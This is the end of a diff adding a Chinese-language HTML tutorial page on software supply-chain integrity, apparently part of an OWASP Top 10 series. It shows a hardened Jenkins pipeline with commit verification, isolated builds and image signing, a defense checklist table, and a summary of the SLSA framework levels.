+        timeout(time: 30, unit: 'MINUTES')  // 防止恶意构建挂起
+    }
+    stages {
+        stage('Verify') {
+            steps {
+                // 验证源码完整性
+                sh 'git verify-commit HEAD'
+                // 验证依赖哈希
+                sh 'npm ci --ignore-scripts'
+                sh 'npm audit --audit-level=high'
+            }
+        }
+        stage('Build') {
+            steps {
+                // 隔离构建环境
+                sh 'docker build --no-cache --network=none .'
+            }
+        }
+        stage('Sign') {
+            steps {
+                // 签名构建产物
+                sh 'cosign sign --key ${SIGNING_KEY} ${IMAGE_NAME}:${BUILD_TAG}'
+            }
+        }
+    }
+}</code></pre>
+
+    <h3>8.5 综合防御检查清单</h3>
+    <table>
+      <thead><tr><th>防御层</th><th>措施</th><th>工具</th></tr></thead>
+      <tbody>
+        <tr><td>依赖管理</td><td>使用 lock 文件，验证包哈希</td><td>npm ci, pip --require-hashes</td></tr>
+        <tr><td>依赖审计</td><td>自动扫描已知漏洞</td><td>Snyk, Dependabot, npm audit</td></tr>
+        <tr><td>代码签名</td><td>签名所有发布和容器镜像</td><td>GPG, cosign, Sigstore</td></tr>
+        <tr><td>SBOM</td><td>生成并维护软件物料清单</td><td>CycloneDX, Syft, SPDX</td></tr>
+        <tr><td>SRI</td><td>为所有 CDN 资源添加完整性哈希</td><td>webpack-subresource-integrity</td></tr>
+        <tr><td>流水线安全</td><td>最小权限、隔离构建、审计日志</td><td>SLSA Framework, in-toto</td></tr>
+        <tr><td>更新验证</td><td>签名验证 + 哈希校验</td><td>TUF (The Update Framework)</td></tr>
+        <tr><td>仓库安全</td><td>分支保护、代码审查、签名提交</td><td>GitHub Branch Protection</td></tr>
+        <tr><td>运行时保护</td><td>禁用反序列化或使用白名单</td><td>RASP, 自定义过滤器</td></tr>
+        <tr><td>监控告警</td><td>监控依赖异常变更</td><td>Socket.dev, Scorecard</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box note">
+      <div class="box-title">SLSA 框架 (Supply-chain Levels for Software Artifacts)</div>
+      <p>Google 提出的 SLSA 框架定义了四个供应链安全等级：</p>
+      <p><strong>Level 1：</strong>构建过程有文档记录（有 SBOM）</p>
+      <p><strong>Level 2：</strong>使用托管构建服务，生成可验证的来源证明</p>
+      <p><strong>Level 3：</strong>构建平台经过审计，源码和构建过程可验证</p>
+      <p><strong>Level 4：</strong>双人审核，密封构建（hermetic build），完全可复现</p>
+    </div>
+
+    <!-- Navigation Footer -->
+    <div class="nav-footer">
+      <a href="A07_认证失效.html">&larr; A07: 认证失效</a>
+      <a href="A09_日志监控失效.html">A09: 日志监控失效 &rarr;</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
